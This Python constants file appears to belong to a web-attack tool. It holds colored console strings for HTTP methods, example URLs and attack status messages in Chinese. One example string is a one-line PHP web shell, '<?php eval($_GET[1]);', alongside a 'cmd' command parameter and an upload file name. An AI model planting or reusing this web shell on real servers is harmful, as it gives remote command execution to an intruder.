from colorama import Fore, Back

GET_METHOD = f"{Fore.GREEN}GET{Fore.WHITE}"
POST_METHOD = f"{Fore.RED}POST{Fore.WHITE}"

# 案例部分
EXAMPLE_URL = f"{Fore.GREEN}(https://host:port/){Fore.WHITE}"
EXAMPLE_URL_PARAM = f"{Fore.GREEN}(?cmd={{0}}){Fore.WHITE}"
EXAMPLE_PHP = f"{Fore.GREEN}(<?php eval($_GET[1]);){Fore.WHITE}"
EXAMPLE_FILE_NAME = f"{Fore.GREEN}(1.php){Fore.WHITE}"

# 状态部分
INFO_START = f"{Back.WHITE}   开始攻击!!!   "
INFO_SUCCESS = f"{Back.GREEN}{Fore.WHITE}   攻击成功!!!   "
INFO_FAIL = f"{Back.RED}{Fore.WHITE}   攻击失败!!!   "
